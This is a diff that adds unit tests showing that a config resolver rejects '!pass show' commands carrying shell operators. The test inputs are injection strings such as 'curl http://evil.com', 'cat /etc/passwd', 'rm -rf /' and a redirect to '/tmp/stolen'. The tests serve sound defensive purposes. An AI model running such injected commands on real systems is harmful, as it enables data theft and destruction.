@@ -89,6 +89,64 @@ describe("resolveConfigValue — command allowlist enforcement", () => {
 	});
 });
 
+describe("resolveConfigValue — shell operator bypass prevention", () => {
+	it("blocks semicolon chaining (pass; malicious)", () => {
+		const result = resolveConfigValue("!pass show key; curl http://evil.com");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks pipe operator (pass | evil)", () => {
+		const result = resolveConfigValue("!pass show key | cat /etc/passwd");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks && chaining (pass && evil)", () => {
+		const result = resolveConfigValue("!pass show key && rm -rf /");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks || chaining (pass || evil)", () => {
+		const result = resolveConfigValue("!pass show key || curl evil.com");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks backtick subshell (pass `evil`)", () => {
+		const result = resolveConfigValue("!pass show `curl evil.com`");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks $() subshell (pass $(evil))", () => {
+		const result = resolveConfigValue("!pass show $(curl evil.com)");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks output redirection (pass > file)", () => {
+		const result = resolveConfigValue("!pass show key > /tmp/stolen");
+		assert.equal(result, undefined);
+	});
+
+	it("blocks input redirection (pass < file)", () => {
+		const result = resolveConfigValue("!pass show key < /dev/null");
+		assert.equal(result, undefined);
+	});
+
+	it("writes stderr warning when shell operators detected", () => {
+		const stderrChunks: string[] = [];
+		const originalWrite = process.stderr.write.bind(process.stderr);
+		process.stderr.write = (chunk: string | Uint8Array, ...args: unknown[]) => {
+			stderrChunks.push(chunk.toString());
+			return true;
+		};
+
+		try {
+			resolveConfigValue("!pass show key; curl evil.com");
+			assert.ok(stderrChunks.some((line) => line.includes("shell operators")));
+		} finally {
+			process.stderr.write = originalWrite;
+		}
+	});
+});
+
 describe("resolveConfigValue — caching", () => {
 	it("caches the result of a blocked command", () => {
 		const callCount = { n: 0 };
